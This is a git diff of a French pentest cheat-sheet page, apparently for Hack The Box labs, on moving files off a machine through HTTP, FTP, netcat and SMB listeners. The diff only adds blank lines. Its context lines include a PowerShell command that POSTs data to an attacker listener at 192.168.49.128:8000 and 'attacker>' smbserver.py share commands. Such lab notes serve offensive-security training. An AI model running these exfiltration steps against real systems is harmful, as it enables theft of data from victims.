@@ -2,6 +2,7 @@
 public: true # set to true to make the article publishable
 ---
 ## Listener HTTP
+
 ```title=configuration du serveur 
 pip3 install uploadserver
 python3 -m uploadserver
@@ -34,7 +35,9 @@ sudo python3 -m pyftpdlib --port 21 --write
 ```
 
 ### Client ftp
+
 On pourra également utiliser simplement le client `ftp`
+
 ## Listener NC
 
 ```
@@ -59,6 +62,7 @@ PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body
 ## SMB
 
 ### SMB Classique
+
 ```
 attacker> sudo smbserver.py myshare ./ -smb2support
 attacker> sudo smbserver.py myshare ./ -smb2support -user rebrec -password blah
